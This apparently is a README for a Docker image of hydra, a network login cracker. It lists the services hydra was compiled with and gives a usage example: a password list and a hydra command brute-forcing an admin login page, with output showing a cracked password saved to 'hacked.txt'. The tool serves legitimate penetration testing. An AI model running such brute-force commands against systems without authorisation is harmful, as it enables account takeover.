hydra
=====

A very fast network logon cracker which support many different services.

- [x] openssl
- [x] idn
- [x] curses
- [x] pcre
- [x] Postgres
- [x] SVN
- [ ] firebird
- [x] MYSQL client
- [ ] AFP
- [ ] NCP
- [ ] SAP/R3
- [x] libssh
- [ ] Oracle
- [ ] GUI req's
- [x] Android specialities
- [x] secure compile option support in gcc


```
$ docker run --rm -it -v `pwd`:/work vimagick/hydra

>>> cat passwd.txt
    123456
    admin
    ...

>>> hydra -l admin -P passwd.txt -o hacked.txt http://www.target.com/login.php
    [DATA] max 1 task per 1 server, overall 64 tasks, 3 login try (l:1/p:1), ~0 tries per task
    [DATA] attacking service http-get on port 2812
    [2812][http-get] host: ss.easypi.info   login: admin   password: admin
    1 of 1 target successfully completed, 1 valid password found

>>> cat hacked.txt
    [2812][http-get] host: ss.easypi.info   login: admin   password: admin
```
